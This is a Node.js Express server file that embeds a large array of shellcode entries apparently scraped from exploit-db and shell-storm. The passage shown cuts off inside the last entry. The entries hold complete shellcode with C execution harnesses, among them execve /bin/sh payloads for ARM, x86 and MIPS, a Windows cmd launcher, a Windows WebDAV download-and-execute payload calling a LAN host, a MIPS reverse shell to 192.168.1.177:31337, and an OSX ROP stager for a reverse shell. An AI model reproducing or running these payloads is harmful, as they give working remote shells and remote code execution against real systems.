const express = require('express');
const morgan = require('morgan');
const cors = require('cors');
const bodyParser = require('body-parser');

const app = express();

app.use(morgan('dev'));
app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());
app.use(cors());

const pag_1 = [
{"Title": "Linux/ARM - Egghunter (0x50905090) + execve('/bin/sh') Shellcode (32 bytes)", "Author": "Ken Kitahara", "Published": ": 2018-05-31", "Platform": "ARM", "Download": "https://old.exploit-db.com/download/44811.c", "View": "https://old.exploit-db.com/raw/44811/", "code": ["/*", "Linux/ARM (Raspberry Pi) - Egghunter + /bin/sh Shellcode (32 bytes)", "", "------------------------------", "// If your shellcode in higer address, use following egghunter.", "pi@raspberrypi:~ $ cat egghunter-higher.s", ".section .text", ".global _start", "    _start:", "    .code 32", "    add r3, pc, #1      // switch to thumb mode", "    bx r3", "", "    .code 16", "    adr r1, startpoint  // set r1 to start point address", "    ldr r2, egg         // set r2 to egg's value", "", "    next_addr:", "    add r1, r1, #1      // increment scan address", "    ldr r3, [r1]        // set r3 to the value stored in r1's address", "    cmp r2, r3          // compare values", "    bne next_addr       // if failed to find egg, jump to next address", "", "    mov r3, pc          // switch to arm mode", "    bx r3", "", "    .code 32", "    mov pc, r1          // jump to found address", "", "egg:", ".ascii \"\\x50\\x90\\x50\\x90\"", "startpoint:", "", "pi@raspberrypi:~ $ ", "", "------------------------------", "// If your shellcode in lower address, use following egghunter.", "pi@raspberrypi:~ $ cat egghunter-lower.s", ".section .text", ".global _start", "    _start:", "    .code 32", "    add r3, pc, #1      // switch to thumb mode", "    bx r3", "", "    .code 16", "    adr r1, startpoint  // set r1 to start point address", "    ldr r2, egg         // set r2 to egg's value", "", "    next_addr:", "    sub r1, r1, #1      // increment scan address", "    ldr r3, [r1]        // set r3 to the value stored in r1's address", "    cmp r2, r3          // compare values", "    bne next_addr       // if failed to find egg, jump to next address", "", "    startpoint:", "    mov r3, pc          // switch to arm mode", "    bx r3", "", "    .code 32", "    mov pc, r1          // jump to found address", "", "egg:", ".ascii \"\\x50\\x90\\x50\\x90\"", "", "pi@raspberrypi:~ $ ", "", "------------------------------", "*/", "", "#include <stdio.h>", "#include <string.h>", "", "// If your shellcode in higer address, use following egghunter.", "unsigned char egghunter[] = \\", "\"\\x01\\x30\\x8f\\xe2\\x13\\xff\\x2f\\xe1\\x05\\xa1\\x04\\x4a\\x01\\x31\\x0b\\x68\\x9a\\x42\\xfb\\xd1\\x7b\\x46\\x18\\x47\\x01\\xf0\\xa0\\xe1\\x50\\x90\\x50\\x90\";", "", "unsigned char egg[] = \\", "\"\\x50\\x90\\x50\\x90\" // egg tag", "\"\\x01\\x30\\x8f\\xe2\\x13\\xff\\x2f\\xe1\" // execve('/bin/sh')", "\"\\x49\\x40\\x52\\x40\\x01\\xa0\\xc2\\x71\"", "\"\\x0b\\x27\\x01\\xdf\\x2f\\x62\\x69\\x6e\"", "\"\\x2f\\x73\\x68\\x41\";", "", "// If your shellcode in lower address, use following egghunter.", "//unsigned char egghunter[] = \\", "//\"\\x01\\x30\\x8f\\xe2\\x13\\xff\\x2f\\xe1\\x02\\xa1\\x04\\x4a\\x01\\x39\\x0b\\x68\\x9a\\x42\\xfb\\xd1\\x7b\\x46\\x18\\x47\\x01\\xf0\\xa0\\xe1\\x50\\x90\\x50\\x90\";", "", "void main()", "{", "    printf(\"Egg hunter shellcode Length:  %d\\n\", strlen(egghunter));", "    printf(\"Egg shellcode Length:  %d\\n\", strlen(egg));", "", "    int (*ret)() = (int(*)())egghunter;", "", "    ret();", "}"]},
{"Title": "Linux/x86 - execve(/bin/sh) Shellcode (24 bytes) (4)", "Author": "Touhid M.Shaikh", "Published": ": 2017-08-06", "Platform": "Linux_x86", "Download": "https://old.exploit-db.com/download/42428.c", "View": "https://old.exploit-db.com/raw/42428/", "code": ["/*", ";Title: Linux/x86 - /bin/sh Shellcode", ";Author: Touhid M.Shaikh", ";Contact: https://github.com/touhidshaikh", ";Category: Shellcode", ";Architecture: Linux x86", ";Description: This shellcode baased on stack method to Execute \"/bin//sh\".", "Length of shellcode is 24 bytes.", ";Tested on : 3.2.0-23-generic-pae #36-Ubuntu SMP Tue Apr 10 22:19:09", "", "", "", "===COMPILATION AND EXECUTION===", "", "#nasm -f elf32 shell.asm -o shell.o <=== Making Object File", "", "#ld -m elf_i386 shell.o -o shell <=== Making Binary File", "", "#./bin2shell.sh shell <== xtract hex code from the binary(", "https://github.com/touhidshaikh/bin2shell)", "", "", "", "=================SHELLCODE(INTEL FORMAT)=================", "", "section .text", "global _start", "_start:", "xor eax,eax", "cdq", "push eax", "push 0x68732f2f", "push 0x6e69622f", "mov ebx,esp", "push eax", "push ebx", "mov ecx, esp", "mov al,0x0b", "int 80h", "", "===================END HERE============================", "", "Compile with gcc with some options.", "", "# gcc -fno-stack-protector -z execstack shell-testing.c -o shell-testing", "", "*/", "", "#include<stdio.h>", "#include<string.h>", "", "", "unsigned char code[] = \\", "\"\\x31\\xc0\\x99\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\";", "", "main()", "{", "", "printf(\"Shellcode Length:  %d\\n\", (int)strlen(code));", "", "int (*ret)() = (int(*)())code;", "", "ret();", "", "}"]},
{"Title": "Windows/x64 - WinExec(cmd.exe) Shellcode (93 bytes)", "Author": "Roziul Hasan Khan Shifat", "Published": ": 2016-10-17", "Platform": "Windows_x86-64", "Download": "https://old.exploit-db.com/download/40549.c", "View": "https://old.exploit-db.com/raw/40549/", "code": ["/*", "\t# Title : Windows x64 WinExec() shellcode", "\t# Date : 15-10-2016", "\t# Author : Roziul Hasan Khan Shifat", "\t# size : 93 bytes", "\t# Tested on : Windows 7 Ultimate x64", "*/", "", "", "/*", "Disassembly of section .text:", "", "0000000000000000 <_start>:", "   0:\t99                   \tcltd   ", "   1:\t65 48 8b 42 60       \tmov    %gs:0x60(%rdx),%rax", "   6:\t48 8b 40 18          \tmov    0x18(%rax),%rax", "   a:\t48 8b 70 10          \tmov    0x10(%rax),%rsi", "   e:\t48 ad                \tlods   %ds:(%rsi),%rax", "  10:\t48 8b 30             \tmov    (%rax),%rsi", "  13:\t48 8b 7e 30          \tmov    0x30(%rsi),%rdi", "  17:\t48 31 db             \txor    %rbx,%rbx", "  1a:\t48 31 f6             \txor    %rsi,%rsi", "  1d:\t8b 5f 3c             \tmov    0x3c(%rdi),%ebx", "  20:\t48 01 fb             \tadd    %rdi,%rbx", "  23:\tb2 88                \tmov    $0x88,%dl", "  25:\t8b 1c 13             \tmov    (%rbx,%rdx,1),%ebx", "  28:\t48 01 fb             \tadd    %rdi,%rbx", "  2b:\t8b 73 1c             \tmov    0x1c(%rbx),%esi", "  2e:\t48 01 fe             \tadd    %rdi,%rsi", "  31:\t99                   \tcltd   ", "  32:\t66 ba 27 05          \tmov    $0x527,%dx", "  36:\t8b 04 96             \tmov    (%rsi,%rdx,4),%eax", "  39:\t48 01 f8             \tadd    %rdi,%rax", "  3c:\teb 17                \tjmp    55 <c>", "", "000000000000003e <exec>:", "  3e:\t59                   \tpop    %rcx", "  3f:\t99                   \tcltd   ", "  40:\t48 ff c2             \tinc    %rdx", "  43:\tff d0                \tcallq  *%rax", "  45:\t99                   \tcltd   ", "  46:\t66 ba 29 01          \tmov    $0x129,%dx", "  4a:\t8b 04 96             \tmov    (%rsi,%rdx,4),%eax", "  4d:\t48 01 f8             \tadd    %rdi,%rax", "  50:\t48 31 c9             \txor    %rcx,%rcx", "  53:\tff d0                \tcallq  *%rax", "", "0000000000000055 <c>:", "  55:\te8 e4 ff ff ff       \tcallq  3e <exec>", "  5a:\t63 6d 64             \tmovslq 0x64(%rbp),%ebp", "\t...", "*/", "", "", "/*", "bits 64", "section .text", "\tglobal  _start", "_start:", "", "", "cdq", "mov rax,[gs:rdx+0x60] ;PEB", "mov rax,[rax+0x18] ;PEB.Ldr", "mov rsi,[rax+0x10] ;PEB.Ldr->InMemOrderModuleList", "lodsq", "mov rsi,[rax]", "mov rdi,[rsi+0x30] ;kernel32.dll base address", "", "", "xor rbx,rbx", "xor rsi,rsi", "", "", "mov ebx,[rdi+0x3c] ;elf_anew", "add rbx,rdi ;PE HEADER", "mov dl,0x88", "mov ebx,[rbx+rdx] ;DataDirectory->VirtualAddress", "add rbx,rdi ;IMAGE_EXPORT_DIRECTORY", "", "mov esi,[rbx+0x1c] ;AddressOfFunctions", "add rsi,rdi", "", "", "cdq", "", "mov dx,1319 ;Ordinal of WinExec()", "", "", "", "", "", "mov eax,[rsi+rdx*4]", "add rax,rdi ;rax=WinExec()", "", "", ";WinExec(\"cmd\",1)", "", "", "jmp c", "", "exec:", "pop rcx", "cdq", "inc rdx", "call rax", "", "", "cdq", "mov dx,297", "", "mov eax,[rsi+rdx*4]", "add rax,rdi ;rax=FatalExit()", "", ";FatalExit(0)", "", "xor rcx,rcx", "call rax", "", "", "", "c:", "", "call exec", "db 'cmd',0,0", "*/", "", "", "#include<stdio.h>", "#include<string.h>", "#include<windows.h>", "", "", "char shellcode[]=\"\\x99\\x65\\x48\\x8b\\x42\\x60\\x48\\x8b\\x40\\x18\\x48\\x8b\\x70\\x10\\x48\\xad\\x48\\x8b\\x30\\x48\\x8b\\x7e\\x30\\x48\\x31\\xdb\\x48\\x31\\xf6\\x8b\\x5f\\x3c\\x48\\x01\\xfb\\xb2\\x88\\x8b\\x1c\\x13\\x48\\x01\\xfb\\x8b\\x73\\x1c\\x48\\x01\\xfe\\x99\\x66\\xba\\x27\\x05\\x8b\\x04\\x96\\x48\\x01\\xf8\\xeb\\x17\\x59\\x99\\x48\\xff\\xc2\\xff\\xd0\\x99\\x66\\xba\\x29\\x01\\x8b\\x04\\x96\\x48\\x01\\xf8\\x48\\x31\\xc9\\xff\\xd0\\xe8\\xe4\\xff\\xff\\xff\\x63\\x6d\\x64\";", "", "", "main()", "{", "\tint len=strlen(shellcode);", "\tDWORD l=0;", "\tprintf(\"shellcode length %d bytes\\n\",len );", "\tVirtualProtect(shellcode,len,PAGE_EXECUTE_READWRITE,&l);", "\t(*  (int(*)()) shellcode    ) ();", "}"]},
{"Title": "Windows/x86 - Download File + Run via WebDAV (//192.168.1.19/c) Null-Free Shellcode (96 bytes)", "Author": "Sean Dillon", "Published": ": 2016-03-02", "Platform": "Windows_x86", "Download": "https://old.exploit-db.com/download/39519.c", "View": "https://old.exploit-db.com/raw/39519/", "code": ["/* ", "* Author:           Sean Dillon", "* Copyright:        (c) 2016 RiskSense, Inc. (https://risksense.com)", "* Release Date:     March 1, 2016", "*", "* Description:      x86 Windows null-free download & run via WebDAV shellcode", "* Assembled Size:   96 bytes", "* Tested On:        Windows XP, Windows 10", "* License:          http://opensource.org/licenses/MIT", "*", "* Build/Run:        MSVC with /NXCOMPAT:NO in Propertes->Linker->Advanced->DEP", "*/", " ", "/* ", "* NOTE: This C code connects to WebDAV at \\\\192.168.1.19:80/c to download and execute an .exe.", "* The WinExec() API downloads and runs dirty files from UNC paths with the \"WebClient\" daemon.", "* The end of this file contains the .nasm source code and instructions for building from that.", "*/", "", "#include <stdio.h>", "#include <string.h>", "", "char shellcode[] =", "    \"\\x6a\\x30\"                      /* push   $0x30 */", "    \"\\x5e\"                          /* pop    %esi */", "    \"\\x64\\xad\"                      /* lods   %fs:(%esi),%eax */", "    \"\\x8b\\x40\\x0c\"                  /* mov    0xc(%eax),%eax */", "    \"\\x8b\\x70\\x0c\"                  /* mov    0xc(%eax),%esi */", "    \"\\xad\"                          /* lods   %ds:(%esi),%eax */", "    \"\\x8b\\x10\"                      /* mov    (%eax),%edx */", "    \"\\x8b\\x5a\\x18\"                  /* mov    0x18(%edx),%ebx */", "    \"\\x89\\xd9\"                      /* mov    %ebx,%ecx */", "    \"\\x03\\x49\\x3c\"                  /* add    0x3c(%ecx),%ecx */", "    \"\\x8b\\x49\\x78\"                  /* mov    0x78(%ecx),%ecx */", "    \"\\x01\\xd9\"                      /* add    %ebx,%ecx */", "    \"\\x8b\\x41\\x20\"                  /* mov    0x20(%ecx),%eax */", "    \"\\x01\\xd8\"                      /* add    %ebx,%eax */", "    \"\\x31\\xd2\"                      /* xor    %edx,%edx */", "    \"\\x52\"                          /* push   %edx */", "    \"\\x5f\"                          /* pop    %edi */", "    \"\\x8b\\x34\\x90\"                  /* mov    (%eax,%edx,4),%esi */", "    \"\\x01\\xde\"                      /* add    %ebx,%esi */", "    \"\\x42\"                          /* inc    %edx */", "    \"\\x81\\x3e\\x57\\x69\\x6e\\x45\"      /* cmpl   $0x456e6957,(%esi) */", "    \"\\x75\\xf2\"                      /* jne    24 <find_winexec> */", "    \"\\x8b\\x71\\x24\"                  /* mov    0x24(%ecx),%esi */", "    \"\\x01\\xde\"                      /* add    %ebx,%esi */", "    \"\\x66\\x8b\\x14\\x56\"              /* mov    (%esi,%edx,2),%dx */", "    \"\\x8b\\x71\\x1c\"                  /* mov    0x1c(%ecx),%esi */", "    \"\\x01\\xde\"                      /* add    %ebx,%esi */", "    \"\\x8b\\x74\\x96\\xfc\"              /* mov    -0x4(%esi,%edx,4),%esi */", "    \"\\x01\\xde\"                      /* add    %ebx,%esi */", "    \"\\x57\"                          /* push   %edi */", "    \"\\x68\\x31\\x39\\x2f\\x63\"          /* push   $0x632f3931 */", "    \"\\x68\\x38\\x2e\\x31\\x2e\"          /* push   $0x2e312e38 */", "    \"\\x68\\x32\\x2e\\x31\\x36\"          /* push   $0x36312e32 */", "    \"\\x68\\x5c\\x5c\\x31\\x39\"          /* push   $0x39315c5c */", "    \"\\x54\"                          /* push   %esp */", "    \"\\xff\\xd6\"                      /* call   *%esi */", "    \"\\xeb\\xfe\";                     /* jmp    5e <spin> */", "", "int main()", "{ ", "    printf(\"Shellcode length: %d\\n\", (int)strlen(shellcode));", "    ", "    (*(void(*)(void))&shellcode)();", "", "    return 0;", "}", "", "/* --------------------------------------------------------------------------------------", "* Author:           Sean Dillon", "* Copyright:        (c) 2016 RiskSense, Inc. (https://risksense.com)", "* Release Date:     March 1, 2016", "*", "* Description:      x86 Windows null-free download & run via WebDAV shellcode", "* Assembled Size:   96 bytes", "* Tested On:        Windows XP, Windows 10", "* License:          http://opensource.org/licenses/MIT", "; ", "; Build/Run:        nasm -o webdav.o webdav.nasm", ";                   ld -o webdav webdav.o", ";                   objdump -d webdav", "", "BITS 32", "global _start", "section .text", "", "push 0x30                       ; PEB offset", "pop esi", "db 0x64                         ; dword ptr fs : []", "lodsd                           ; eax = NtCurrentTeb()->ProcessEnvironmentBlock", "mov eax, [eax + 0x0c]           ; eax = PEB->Ldr", "mov esi, [eax + 0x0c]           ; eax = PEB->Ldr.InLoadOrder", "lodsd", "mov edx, [eax]", "mov ebx, [edx + 0x18]           ; ebx = GetModuleHandle(L\"kernel32.dll\")", "", "mov ecx, ebx                    ; ecx = (IMAGE_DOS_HEADERS *)ebx", "add ecx, [ecx + 0x3c]           ; ecx = ecx->e_lfanew", "mov ecx, [ecx + 0x78]           ; ecx = ecx->OptionalHeader.DataDirectory[0].VirtualAddress", "add ecx, ebx                    ; ecx = IMAGE_EXPORT_DIRECTORY", "", "mov eax, [ecx + 0x20]           ; eax = ecx->AddressOfNames", "add eax, ebx", "", "xor edx, edx                    ; edx = 0", "push edx", "pop edi                         ; edi = 0", "", "find_winexec:", "mov esi, [eax + edx * 4]        ; esi = ExportNamePointerTable[edx]", "add esi, ebx ", "inc edx                         ; ++edx", "", "cmp dword [esi], 0x456e6957     ; if (memcmp(esi, \"WinE\", 4) != 0)", "jne find_winexec                ;   goto find_winexec", "", "mov esi, [ecx + 0x24]           ; esi = ecx->AddressOfNameOrdinals", "add esi, ebx", "", "mov dx, [esi + edx * 2]         ; dx = ExportOrdinalTable[edx]", "mov esi, [ecx + 0x1c]           ; esi = ecx->AddressOfFunctions", "add esi, ebx                    ;", "", "mov esi, [esi + edx * 4 - 4]    ; esi = &WinExec()", "add esi, ebx", "", "push edi                        ; '\\0'", "push 0x632f3931", "push 0x2e312e38", "push 0x36312e32", "push 0x39315c5c", "push esp                        ; ss = \\\\192.168.1.19/c", "", "; Python2 one-liner to generate host string stack pushes", "; \"0x\"+\"\\n0x\".join(map(''.join, zip(*[iter('\\\\\\\\192.168.1.19/c'[::-1].encode('hex'))]*8)))", "", "call esi", "", "spin:                           ; loop forever, downloaded process has taken over", "jmp spin                        ; second stage can clean up", "", ";--------------------------------------------------------------------------------------*/"]},
{"Title": "Linux/x86 - execve(/bin/sh) Shellcode (26 bytes)", "Author": "Reza Behzadpour", "Published": ": 2015-05-20", "Platform": "Linux_x86", "Download": "https://old.exploit-db.com/download/37069.c", "View": "https://old.exploit-db.com/raw/37069/", "code": ["/*", "; Title: Linux/x86 execve \"/bin/sh\" - shellcode 26 bytes", "; Platform: linux/x86_64", "; Date: 2015-05-19", "; Author: Reza Behzadpour", "; Simple ShellCode", "", "\tsection .text", "\tglobal _start", "\t", "\t_start:", "\t", "\txor  ecx,ecx", "\tmul  ecx", "", "\t;execve(\"/bin/sh\", NULL, NULL)", "\tmov  al,11", "\tjmp  shell", "\tshell_ret:", "\tpop  ebx", "\tpush ecx", "\tpush ebx", "\tpop  ebx", "\tint  0x80", " ", "\tshell:", "\tcall shell_ret", "\tdb  \"/bin/sh\"", "", "*/", "", "/*", "", "# tcc -o ./shellcode ./shellcode.c", "# uname -r", "3.12-kali1-686-pae", "", "*/", "", "#include <stdio.h>", "#include <string.h>", "  ", "char shellcode[] = {", "     \"\\x31\\xc9\\xf7\\xe1\\xb0\\x0b\\xeb\\x06\\x5b\"", "     \"\\x51\\x53\\x5b\\xcd\\x80\\xe8\\xf5\\xff\\xff\"", "     \"\\xff\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\"", "};", " ", "int main() ", "{", " ", "\tprintf(\"Shellcode Length:  %d\\n\", (int)strlen(shellcode));", "\tint *ret;", "\tret = (int *) &ret + 2;", "\t(*ret) = (int) shellcode;", " ", "\treturn 0;", "}"]},
{"Title": "Linux/MIPS (Little Endian) - Reverse (192.168.1.177:31337/TCP) Shell (/bin/sh) Shellcode (200 bytes)", "Author": "Jacob Holcomb", "Published": ": 2013-11-04", "Platform": "Linux_MIPS", "Download": "http://shell-storm.org/shellcode/files/shellcode-860.php", "View": null, "code": ["# MIPS Little Endian Reverse Shell ASM File and Assembled Shellcode", "# Written by Jacob Holcomb, Security Analyst @ Independent Security Evaluators", "# Blog: http://infosec42.blogspot.com", "# Company Website: http://securityevaluators.com", "", "", "    .data", "", "    .bss", "", "    .text", "", "    .globl _start", "", "_start:", "", "    #Close stdin(0)", "    slti $a0, $zero, 0xFFFF", "    li $v0, 4006", "    syscall 0x42424", "", "    #Close stdout(1)", "    slti $a0, $zero, 0x1111", "    li $v0, 4006", "    syscall 0x42424", "", "    #Close stderr(2)", "    li $t4, 0xFFFFFFFD #-3", "    not $a0, $t4", "    li $v0, 4006", "    syscall 0x42424", "", "    #Socket Domain - AF_INET (2)", "    li $t4, 0xFFFFFFFD #-3", "    not $a0, $t4", "    #Socket Type - SOCK_STREAM (2 for mips)", "    not $a1, $t4", "    #Socket Protocol - 0", "    slti $a2, $zero, 0xFFFF", "    #Call socket", "    li $v0, 4183", "    syscall 0x42424", "", "    #Move socket return value (v0) to register a0", "    #V0 must be below 0xFFFF/65535", "    andi $a0, $v0, 0xFFFF", "", "    #Calling dup three times", "    #Duplicate FD (stdin)", "    #Socket returned fd 0 - stdin goes to socket", "    #-----", "    #Duplicate FD (stdout)", "    li $v0, 4041", "    syscall 0x42424", "    #Duplicate FD (stderr)", "    li $v0, 4041", "    syscall 0x42424", "", "    #Connect sockfd", "    #Socket FD is already in a0", "    #-----", "    #Connect sockaddr", "    lui $a1, 0x6979 #Port:", "    ori $a1, 0xFF01 #31337", "    addi $a1, $a1, 0x0101", "    sw $a1, -8($sp)", "", "    li $a1, 0xB101A8C0 #192.168.1.177", "    sw $a1, -4($sp)", "    addi $a1, $sp, -8", "", "    #Connect addrlen - 16", "    li $t4, 0xFFFFFFEF #-17", "    not $a2, $t4", "    #Call connect", "    li $v0, 4170", "    syscall 0x42424", "", "    #Putting /bin/sh onto the stack", "    lui $t0, 0x6962 #Loading Upper Immediate - ib", "    ori $t0, $t0,0x2f2f #Bitwise OR Immediate - //", "    sw $t0, -20($sp) #Store word pointer to command string for execution", "    #", "    lui $t0, 0x6873 #Loading Upper Immediate - hs", "    ori $t0, 0x2f6e #Bitwise OR Immediate - /n", "    sw $t0, -16($sp) #Store word pointer to command string for execution", "    #", "    slti $a3, $zero, 0xFFFF #Putting null (0) onto stack", "    sw $a3, -12($sp)", "    sw $a3, -4($sp)", "", "    #execve *filename", "    addi $a0, $sp, -20", "    #execve *argv[]", "    addi $t0, $sp, -20", "    sw $t0, -8($sp)", "    addi $a1, $sp, -8", "    #", "    addiu $sp, $sp, -20 #Adjusting stack  ", "    #", "    #execve envp[] - 0", "    slti $a2, $zero, 0xFFFF", "    #Call execve", "    li $v0, 4011", "    syscall 0x42424", "", "", "", "# NOTE: Assembled shellcode", "", "    #200 byte Linux MIPS reverse shell shellcode by Jacob Holcomb of ISE", "    #Connects on 192.168.1.177:31337", "    stg3_SC = \"\\xff\\xff\\x04\\x28\\xa6\\x0f\\x02\\x24\\x0c\\x09\\x09\\x01\\x11\\x11\\x04\\x28\"", "    stg3_SC += \"\\xa6\\x0f\\x02\\x24\\x0c\\x09\\x09\\x01\\xfd\\xff\\x0c\\x24\\x27\\x20\\x80\\x01\"", "    stg3_SC += \"\\xa6\\x0f\\x02\\x24\\x0c\\x09\\x09\\x01\\xfd\\xff\\x0c\\x24\\x27\\x20\\x80\\x01\"", "    stg3_SC += \"\\x27\\x28\\x80\\x01\\xff\\xff\\x06\\x28\\x57\\x10\\x02\\x24\\x0c\\x09\\x09\\x01\"", "    stg3_SC += \"\\xff\\xff\\x44\\x30\\xc9\\x0f\\x02\\x24\\x0c\\x09\\x09\\x01\\xc9\\x0f\\x02\\x24\"", "    stg3_SC += \"\\x0c\\x09\\x09\\x01\\x79\\x69\\x05\\x3c\\x01\\xff\\xa5\\x34\\x01\\x01\\xa5\\x20\"", "    stg3_SC += \"\\xf8\\xff\\xa5\\xaf\\x01\\xb1\\x05\\x3c\\xc0\\xa8\\xa5\\x34\\xfc\\xff\\xa5\\xaf\"", "    stg3_SC += \"\\xf8\\xff\\xa5\\x23\\xef\\xff\\x0c\\x24\\x27\\x30\\x80\\x01\\x4a\\x10\\x02\\x24\"", "    stg3_SC += \"\\x0c\\x09\\x09\\x01\\x62\\x69\\x08\\x3c\\x2f\\x2f\\x08\\x35\\xec\\xff\\xa8\\xaf\"", "    stg3_SC += \"\\x73\\x68\\x08\\x3c\\x6e\\x2f\\x08\\x35\\xf0\\xff\\xa8\\xaf\\xff\\xff\\x07\\x28\"", "    stg3_SC += \"\\xf4\\xff\\xa7\\xaf\\xfc\\xff\\xa7\\xaf\\xec\\xff\\xa4\\x23\\xec\\xff\\xa8\\x23\"", "    stg3_SC += \"\\xf8\\xff\\xa8\\xaf\\xf8\\xff\\xa5\\x23\\xec\\xff\\xbd\\x27\\xff\\xff\\x06\\x28\"", "    stg3_SC += \"\\xab\\x0f\\x02\\x24\\x0c\\x09\\x09\\x01\""]},
{"Title": "OSX/x64 - Universal ROP + Reverse (/TCP) Shell Shellcode", "Author": "pa_kt", "Published": ": 2011-07-24", "Platform": "OSX", "Download": "http://shell-storm.org/shellcode/files/shellcode-786.php", "View": null, "code": ["; universal OSX dyld ROP shellcode", "; tested on OS X 10.6.8", "; ", "; if you don't want to compile, copy stage0 code from precompiled.txt", "; and append your normal shellcode to it.", ";", "; usage:", "; - put your 'normal' shellcode in x64_shellcode.asm", "; - make", "; - ./sc", ";", "; if you want to test:", "; - uncomment lea rsp, [rel rop_stage0] / ret", "; - make", "; - nc -l 4444", "; - ./sc", "; - you should get a shell over nc", "; ", "; see my blog, if you want to know how this works:", "; http://gdtr.wordpress.com", ";", "; greets to Jacob Hammack, for his reverse tcp shellcode (hammackj.com).", ";", "; pa_kt", "; twitter.com/pa_kt", "", "extern _printf", "", "global _main", "", ";--------------------------------------------------", ";- DATA", ";--------------------------------------------------", "section .data", "    ", "rw_area     equ 0x00007FFF5FC50000", "rwx_area    equ rw_area+0x1000", "vm_prot     equ 0x00007FFF5FC0D356", "fake_stack  equ rw_area+0x2000", "fake_frame  equ fake_stack+0x100", "r12_zero    equ rw_area-0x1000", "", "rax_off     equ rw_area-8", "rbx_off     equ rw_area+8-8", "rcx_off     equ rw_area+0x10-8", "rdx_off     equ rw_area+0x18-8", "rsi_off     equ rw_area+0x28-8", "rbp_off     equ rw_area+0x30-8", "rsp_off     equ rw_area+0x38-8", "r8_off      equ rw_area+0x40-8", "r12_off     equ rw_area+0x60-8", "", "pop_rdi     equ 0x00007FFF5FC24CDC", "pop_rbx     equ 0x00007FFF5FC23373", "store_reg   equ 0x00007FFF5FC24CE1", "set_regs    equ 0x00007FFF5FC24CA1", "", "c_rwx       equ 7", "c_size      equ 0x1000", "c_addr      equ rwx_area", "c_set_max   equ 0", "", "dbg_ret     equ 0x00007FFF5FC24C4B", "", "; copy shellcode to RWX area", "; size = 0x1000", "stub:", "    lea rsi, [r15+saved_rsp_off+copy_stub_size+rop_post_size]", "    xor rcx, rcx", "    inc rcx", "    shl rcx, 12 ;rcx = 0x1000", "    lea rdi, [rel normal_shellcode]", "    rep movsb", "    ;int 3", "normal_shellcode:", "", "stub_size   equ $-stub", "", "            ; order is important", "rop_pre     dq  pop_rdi, rcx_off, pop_rbx, c_set_max, store_reg,", "            dq  pop_rdi, rdx_off, pop_rbx, c_size, store_reg,", "            dq  pop_rdi, rsi_off, pop_rbx, c_addr, store_reg,", "            dq  pop_rdi, rbp_off, pop_rbx, fake_frame, store_reg,", "            dq  pop_rdi, rsp_off, pop_rbx, fake_stack, store_reg,", "            dq  pop_rdi, r8_off, pop_rbx, c_rwx, store_reg,", "            dq  pop_rdi, r12_off, pop_rbx, r12_zero, store_reg,", "", "            ; set fake stack", "            dq  pop_rdi, fake_stack+8-8, pop_rbx, vm_prot, store_reg,", "            ", "            ; set fake frame (return address -> rwx page)", "            dq  pop_rdi, fake_frame-8-0x38, store_reg,", "saved_rsp:", "            dq  pop_rdi, fake_frame+8-8, pop_rbx, rwx_area, store_reg,", "", "rop_pre_size    equ $-rop_pre            ", "saved_rsp_off   equ $-saved_rsp-8", "", "rop_post    dq  dbg_ret", "            ", "            ; set all regs and jump to vm_prot", "            dq  pop_rdi, rw_area, set_regs", "            ; marker", "            ; dq 0x1111111111111111", "", "rop_post_size   equ $-rop_post", "", "x64_shellcode:   incbin \"x64_shellcode\"", "x64_shellcode_size     equ $-x64_shellcode", "", "hello   db \"test\", 0", "fmt     db \"\\x%02x\",0", "", "section .bss", "", "rop_stage0  resq    100", "copy_stub   resq    ((stub_size+7)/8)*5", "copy_stub_size  equ $-copy_stub ", "", ";--------------------------------------------------    ", ";- CODE", ";--------------------------------------------------", "section .text", "", "prep_stub:", "", "    mov     rcx, (stub_size+7)/8", "    mov     rsi, stub", "    mov     rdi, copy_stub", "    mov     rbx, rwx_area-8", "go:", "    mov     rax, pop_rdi", "    stosq", "    mov     rax, rbx", "    stosq", "    mov     rax, pop_rbx", "    stosq", "    movsq", "    mov     rax, store_reg", "    stosq", "    add     rbx, 8", "    loop    go", "    ret", "", "make_stage0:", "    mov     rsi, rop_pre", "    mov     rdi, rop_stage0", "    mov     rcx, rop_pre_size", "    rep     movsb", "    ", "    mov     rsi, copy_stub", "    mov     rcx, copy_stub_size", "    rep     movsb", "", "    mov     rsi, rop_post", "    mov     rcx, rop_post_size", "    rep     movsb", "    ", "    mov     rsi, x64_shellcode", "    mov     rcx, x64_shellcode_size", "    rep     movsb", "", "    ret", "", "print_it:", "    push    rbp", "    mov     rbp, rsp", "", "    mov     rcx, rop_pre_size + copy_stub_size + rop_post_size + x64_shellcode_size", "    lea     rsi, [rel rop_stage0]", "    xor     rax, rax", "one_char:", "    lodsb ", "    push    rsi", "    push    rcx", "    mov     rsi, rax", "    mov     rdi, qword fmt", "    xor     rax, rax", "    call    _printf", "    pop     rcx", "    pop     rsi", "    loop    one_char", "    ", "    leave ", "    ret", "", "_main:", "    push    qword rbp", "    mov     rbp, rsp", "", "    call    prep_stub", "    call    make_stage0", "", "    call    print_it", "", "    ;lea     rsp, [rel rop_stage0]", "    ;ret", "", "    leave", "    ret", "", "; see http://t.co/nIrRbn5 for a detailed explanation", "; full package mirror: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/17564.tgz (osx.rop.24072011.tgz)"]},
{"Title": "Linux/MIPS - execve(/bin/sh) Shellcode (52 bytes)", "Author": "entropy", "Published": ": 2011-10-07", "Platform": "Linux_MIPS", "Download": "http://shell-storm.org/shellcode/files/shellcode-782.php", "View": null, "code": ["#include <stdio.h>", "/*", "", "entropy [at] phiral.net", "52 byte linux mips shellcode", "oh werd", "", "entropy@phiral.mips {~/encode/1/2} cat s.s", ".section .text", ".globl __start", ".set noreorder", "__start:", "    li $a2, 0x666", "p:  bltzal $a2, p", "    slti $a2, $zero, -1", "    addu $sp, $sp, -32", "    addu $a0, $ra, 4097", "    addu $a0, $a0, -4065", "    sw $a0, -24($sp)", "    sw $zero, -20($sp)", "    addu $a1, $sp, -24", "    li $v0, 4011", "    syscall 0x40404", "sc:", "    .byte 0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68", "", "entropy@phiral.mips {~/encode/1/2} as s.s -o s.o", "entropy@phiral.mips {~/encode/1/2} ld s.o -o s", "entropy@phiral.mips {~/encode/1/2} ./s", "$ exit", "", "*/", "", "char sc[] = {", "    